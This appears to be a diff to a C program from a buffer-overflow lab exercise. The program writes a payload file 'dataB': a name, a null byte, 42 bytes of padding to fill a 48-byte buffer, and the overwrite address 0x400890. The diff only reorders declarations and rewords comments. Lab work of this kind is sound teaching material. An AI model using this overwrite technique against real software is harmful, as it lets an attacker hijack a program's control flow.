@@ -15,21 +15,25 @@
  * returns 0 on success.
  */
 int main(void) {
-    FILE *fp = fopen("dataB", "wb");
+    FILE *fp;
+    int i;
+    uint64_t target_addr;
     
-    /* name */
+    fp = fopen("dataB", "wb");
+    
+    /* Write student name */
     fwrite("Kevin", 1, 5, fp);
     
-    /* null terminator */
+    /* Write null terminator */
     fputc('\0', fp);
     
-    /* padding to fill remaining buf space (48 - 6 = 42 bytes) */
-    for (int i = 0; i < 42; i++) {
+    /* Write padding to fill remaining buf space (48 - 6 = 42 bytes) */
+    for (i = 0; i < 42; i++) {
         fputc('A', fp);  /* Arbitrary padding character */
     }
     
     /* Write target address 0x400890 in little-endian format */
-    uint64_t target_addr = 0x400890;
+    target_addr = 0x400890;
     fwrite(&target_addr, sizeof(target_addr), 1, fp);
     
     fclose(fp);
